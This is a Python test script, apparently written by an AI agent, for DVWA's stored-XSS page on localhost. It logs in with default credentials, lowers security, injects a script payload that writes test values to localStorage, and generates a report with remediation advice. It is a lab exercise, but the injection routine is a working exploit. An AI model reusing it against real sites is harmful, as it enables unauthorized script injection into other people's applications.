#!/usr/bin/env python3
"""
DVWA Local Storage (OTG-CLIENT-012) Test Script
Author: AI Security Agent
Description: Educational testing for Local Storage security implications in DVWA
Note: DVWA does not use localStorage, but this demonstrates the risk via XSS
"""

import requests
from bs4 import BeautifulSoup
import logging
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time
import os
from datetime import datetime
import html
import json

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class DVWALocalStorageTester:
    def __init__(self):
        self.base_url = "http://localhost/dvwa"
        self.session = requests.Session()
        self.driver = None
        self.findings = {
            'initial_localstorage': {},
            'initial_sessionstorage': {},
            'final_localstorage': {},
            'final_sessionstorage': {},
            'xss_payload': '',
            'xss_executed': False,
            'storage_manipulated': False
        }
        
    def setup_driver(self):
        """Setup Chrome WebDriver for Selenium"""
        try:
            options = webdriver.ChromeOptions()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-extensions')
            options.add_argument('--disable-plugins')
            options.add_argument('--disable-images')
            options.add_experimental_option('useAutomationExtension', False)
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            
            self.driver = webdriver.Chrome(options=options)
            self.driver.implicitly_wait(10)
            logger.info("WebDriver initialized successfully")
        except Exception as e:
            logger.error(f"Failed to initialize WebDriver: {e}")
            raise

    def login_to_dvwa(self):
        """Login to DVWA with default credentials"""
        try:
            # Get login page
            response = self.session.get(f"{self.base_url}/login.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract user token
            user_token_input = soup.find('input', {'name': 'user_token'})
            if user_token_input and user_token_input.get('value'):
                user_token = user_token_input['value']
                logger.info(f"Extracted user token: {user_token}")
            else:
                logger.error("Could not find user token in login page")
                return False
            
            # Login data
            login_data = {
                'username': 'admin',
                'password': 'password',
                'user_token': user_token,
                'Login': 'Login'
            }
            
            # Perform login
            login_response = self.session.get(f"{self.base_url}/login.php")  # Get fresh token
            soup = BeautifulSoup(login_response.text, 'html.parser')
            user_token_input = soup.find('input', {'name': 'user_token'})
            if user_token_input and user_token_input.get('value'):
                login_data['user_token'] = user_token_input['value']
            
            login_response = self.session.post(f"{self.base_url}/login.php", data=login_data)
            
            if "Welcome :: Damn Vulnerable Web Application" in login_response.text:
                logger.info("Successfully logged into DVWA")
                return True
            else:
                logger.error("Failed to login to DVWA")
                return False
                
        except Exception as e:
            logger.error(f"Error during login: {e}")
            return False

    def set_security_level(self):
        """Set DVWA security level to Low"""
        try:
            response = self.session.get(f"{self.base_url}/security.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract user token
            user_token_input = soup.find('input', {'name': 'user_token'})
            user_token = ''
            if user_token_input and user_token_input.get('value'):
                user_token = user_token_input['value']
            else:
                logger.warning("Could not find user token, proceeding without it")
            
            # Set security to low
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit'
            }
            
            # Add user token if found
            if user_token:
                security_data['user_token'] = user_token
            
            self.session.post(f"{self.base_url}/security.php", data=security_data)
            logger.info("Security level set to Low")
            return True
            
        except Exception as e:
            logger.error(f"Error setting security level: {e}")
            return False

    def check_initial_storage_state(self):
        """Check initial localStorage and sessionStorage state"""
        try:
            if not self.driver:
                logger.error("WebDriver not initialized")
                return
            
            # Navigate to main DVWA page
            self.driver.get(f"{self.base_url}/")
            
            # Get localStorage
            local_storage = self.driver.execute_script("return JSON.stringify(window.localStorage);")
            self.findings['initial_localstorage'] = json.loads(local_storage) if local_storage else {}
            
            # Get sessionStorage
            session_storage = self.driver.execute_script("return JSON.stringify(window.sessionStorage);")
            self.findings['initial_sessionstorage'] = json.loads(session_storage) if session_storage else {}
            
            logger.info("Initial storage state checked")
            logger.info(f"Initial localStorage: {self.findings['initial_localstorage']}")
            logger.info(f"Initial sessionStorage: {self.findings['initial_sessionstorage']}")
            
        except Exception as e:
            logger.error(f"Error checking initial storage state: {e}")

    def test_local_storage_xss_exploitation(self):
        """Test exploitation of localStorage via Stored XSS"""
        try:
            if not self.driver:
                logger.error("WebDriver not initialized")
                return
            
            # Payload to write to localStorage
            xss_payload = "<script>localStorage.setItem('dvwa_xss_test', 'exploited_" + datetime.now().strftime("%H%M%S") + "'); sessionStorage.setItem('dvwa_session_test', 'session_exploited');</script>"
            self.findings['xss_payload'] = xss_payload
            
            logger.info("Injecting XSS payload to manipulate localStorage")
            
            # Get stored XSS page
            response = self.session.get(f"{self.base_url}/vulnerabilities/xss_s/")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract user token
            user_token_input = soup.find('input', {'name': 'user_token'})
            user_token = ''
            if user_token_input and user_token_input.get('value'):
                user_token = user_token_input['value']
                logger.info(f"Extracted user token for stored XSS: {user_token}")
            
            # Submit XSS payload
            post_data = {
                'txtName': 'LocalStorageTester',
                'mtxMessage': xss_payload,
                'btnSign': 'Sign Guestbook'
            }
            
            if user_token:
                post_data['user_token'] = user_token
            
            self.session.post(f"{self.base_url}/vulnerabilities/xss_s/", data=post_data)
            logger.info("XSS payload submitted to stored XSS page")
            
            # Visit the page to trigger XSS
            self.driver.get(f"{self.base_url}/vulnerabilities/xss_s/")
            
            # Wait a moment for script execution
            time.sleep(2)
            
            # Check if localStorage was modified
            local_storage = self.driver.execute_script("return JSON.stringify(window.localStorage);")
            session_storage = self.driver.execute_script("return JSON.stringify(window.sessionStorage);")
            
            self.findings['final_localstorage'] = json.loads(local_storage) if local_storage else {}
            self.findings['final_sessionstorage'] = json.loads(session_storage) if session_storage else {}
            
            # Check if our test key was added
            if 'dvwa_xss_test' in self.findings['final_localstorage']:
                self.findings['xss_executed'] = True
                self.findings['storage_manipulated'] = True
                logger.info("XSS payload executed successfully - localStorage manipulated")
                logger.info(f"Modified localStorage: {self.findings['final_localstorage']}")
            else:
                logger.info("XSS payload may not have executed - localStorage unchanged")
                
        except Exception as e:
            logger.error(f"Error testing localStorage XSS exploitation: {e}")

    def verify_storage_persistence(self):
        """Verify that localStorage data persists across page loads"""
        try:
            if not self.driver:
                logger.error("WebDriver not initialized")
                return
            
            # Navigate away and back
            self.driver.get(f"{self.base_url}/security.php")
            time.sleep(1)
            self.driver.get(f"{self.base_url}/vulnerabilities/xss_s/")
            time.sleep(1)
            
            # Check localStorage again
            local_storage = self.driver.execute_script("return JSON.stringify(window.localStorage);")
            current_localstorage = json.loads(local_storage) if local_storage else {}
            
            if 'dvwa_xss_test' in current_localstorage:
                logger.info("localStorage data persists across page loads")
            else:
                logger.info("localStorage data may not persist")
                
        except Exception as e:
            logger.error(f"Error verifying storage persistence: {e}")

    def generate_html_report(self):
        """Generate OSCP-style HTML report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Format storage data for display
        initial_local = json.dumps(self.findings['initial_localstorage'], indent=2)
        initial_session = json.dumps(self.findings['initial_sessionstorage'], indent=2)
        final_local = json.dumps(self.findings['final_localstorage'], indent=2)
        final_session = json.dumps(self.findings['final_sessionstorage'], indent=2)
        xss_payload = html.escape(self.findings['xss_payload'])
        
        # HTML escape for safe display
        initial_local_escaped = html.escape(initial_local)
        initial_session_escaped = html.escape(initial_session)
        final_local_escaped = html.escape(final_local)
        final_session_escaped = html.escape(final_session)
        
        # Determine status
        if self.findings['storage_manipulated']:
            status = '<span class="vulnerable">Vulnerable (XSS Can Manipulate Storage)</span>'
        elif self.findings['initial_localstorage'] or self.findings['initial_sessionstorage']:
            status = '<span class="info">In Use (Check Security)</span>'
        else:
            status = '<span class="safe">Not In Use (But Exploitable)</span>'

        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>OSCP-Style Security Assessment Report</title>
  <style>
    /* OSCP-inspired styling: monospace, dark theme, clean layout */
    body {{ 
      font-family: 'Courier New', monospace; 
      background: #111; 
      color: #00FF00; 
      padding: 20px; 
      line-height: 1.6;
    }}
    .header {{ text-align: center; margin-bottom: 30px; }}
    h1, h2, h3 {{ color: #00CCFF; border-bottom: 1px solid #00CCFF; padding-bottom: 5px; }}
    .section {{ margin: 20px 0; }}
    pre {{ 
      background: #222; 
      padding: 12px; 
      border-left: 5px solid #00CCFF; 
      overflow-x: auto; 
      font-size: 0.9em;
      color: #FFCC00;
    }}
    .evidence {{ color: #FFCC00; font-weight: bold; }}
    .recommendation {{ color: #AAFF00; }}
    .vulnerable {{ color: #FF5555; font-weight: bold; }}
    .safe {{ color: #55FF55; }}
    .info {{ color: #55AAFF; }}
    footer {{ margin-top: 60px; font-size: 0.8em; text-align: center; color: #666; }}
    code {{ background: #333; padding: 2px 4px; border-radius: 3px; }}
  </style>
</head>
<body>
  <div class="header">
    <h1>Security Assessment Report</h1>
    <p><strong>Test ID:</strong> OTG-CLIENT-012</p>
    <p><strong>Vulnerability:</strong> Local Storage Security</p>
    <p><strong>Target:</strong> http://localhost/dvwa/</p>
    <p><strong>Date:</strong> {timestamp}</p>
  </div>

  <div class="section">
    <h2>1. Test Overview</h2>
    <p><strong>Objective:</strong> Assess the security of client-side storage mechanisms (localStorage, sessionStorage) and their exposure to XSS.</p>
    <p><strong>OWASP Reference:</strong> OTG-CLIENT-012</p>
    <p><strong>Note:</strong> DVWA does not natively use Local Storage. This test demonstrates the <strong>theoretical risk</strong> and how XSS can fully compromise localStorage if used.</p>
  </div>

  <div class="section">
    <h2>2. Test Procedure</h2>
    <p>1. Authenticate to DVWA using provided credentials.</p>
    <p>2. Set security level to <strong>Low</strong>.</p>
    <p>3. Check initial <code>localStorage</code> and <code>sessionStorage</code> state.</p>
    <p>4. Exploit Stored XSS to inject JavaScript that manipulates <code>localStorage</code>.</p>
    <p>5. Verify that data can be written, read, and persisted.</p>
    <p>6. Analyze security implications.</p>
  </div>

  <div class="section">
    <h2>3. Findings</h2>
    <h3>Local Storage Usage</h3>
    <p><strong>Status:</strong> {status}</p>
    <p><strong>XSS Payload Used:</strong></p>
    <pre>{xss_payload}</pre>
    <p><strong>Initial Storage State:</strong></p>
    <pre>
localStorage: {initial_local_escaped}
sessionStorage: {initial_session_escaped}
    </pre>
    <p><strong>Final Storage State:</strong></p>
    <pre>
localStorage: {final_local_escaped}
sessionStorage: {final_session_escaped}
    </pre>
    <p class="evidence"><strong>Evidence:</strong> {'Stored XSS vulnerability allows full read/write access to localStorage. Data was successfully manipulated and persists.' if self.findings['storage_manipulated'] else 'No localStorage manipulation detected. DVWA does not currently use localStorage.'}</p>
  </div>

  <div class="section">
    <h2>4. Impact</h2>
    <p>If DVWA stored sensitive data (e.g., tokens, user IDs) in localStorage, an XSS vulnerability would lead to full account compromise. Unlike HttpOnly cookies, localStorage is fully accessible to JavaScript and cannot be protected from XSS. Even though DVWA does not currently use localStorage, this test demonstrates the critical risk of combining client-side storage with XSS vulnerabilities.</p>
  </div>

  <div class="section">
    <h2>5. Recommendations</h2>
    <p class="recommendation">- Never store session tokens or PII in localStorage or sessionStorage.</p>
    <p class="recommendation">- Use HttpOnly cookies for session management to prevent XSS access.</p>
    <p class="recommendation">- Implement strong Content Security Policy (CSP) to mitigate XSS.</p>
    <p class="recommendation">- Sanitize all user inputs to prevent XSS, which is the primary vector for localStorage abuse.</p>
    <p class="recommendation">- Educate developers on secure client-side data storage practices.</p>
    <p class="recommendation">- Regularly audit client-side code for insecure storage patterns.</p>
  </div>

  <footer>
    &copy; 2025 Automated Security Testing Framework. Report generated by AI Agent.
  </footer>
</body>
</html>"""

        # Write report to file
        try:
            with open("OTG-CLIENT-012_Report.html", "w", encoding="utf-8") as f:
                f.write(html_content)
            logger.info("HTML report generated: OTG-CLIENT-012_Report.html")
        except Exception as e:
            logger.error(f"Failed to write HTML report: {e}")

    def run_tests(self):
        """Main method to run all tests"""
        try:
            logger.info("Starting DVWA Local Storage Test (OTG-CLIENT-012)")
            
            # Setup
            self.setup_driver()
            
            # Login and configure
            if not self.login_to_dvwa():
                logger.error("Failed to login to DVWA. Exiting.")
                return
            
            if not self.set_security_level():
                logger.warning("Failed to set security level, continuing with default")
            
            # Check initial storage state
            logger.info("Checking initial localStorage and sessionStorage state...")
            self.check_initial_storage_state()
            
            # Test localStorage manipulation via XSS
            logger.info("Testing localStorage manipulation via Stored XSS...")
            self.test_local_storage_xss_exploitation()
            
            # Verify persistence
            logger.info("Verifying storage persistence...")
            self.verify_storage_persistence()
            
            # Generate report
            self.generate_html_report()
            
            logger.info("Local Storage analysis completed successfully")
            
        except Exception as e:
            logger.error(f"Error during testing: {e}")
        finally:
            # Cleanup
            if self.driver:
                self.driver.quit()
                logger.info("WebDriver closed")

if __name__ == "__main__":
    tester = DVWALocalStorageTester()
    tester.run_tests()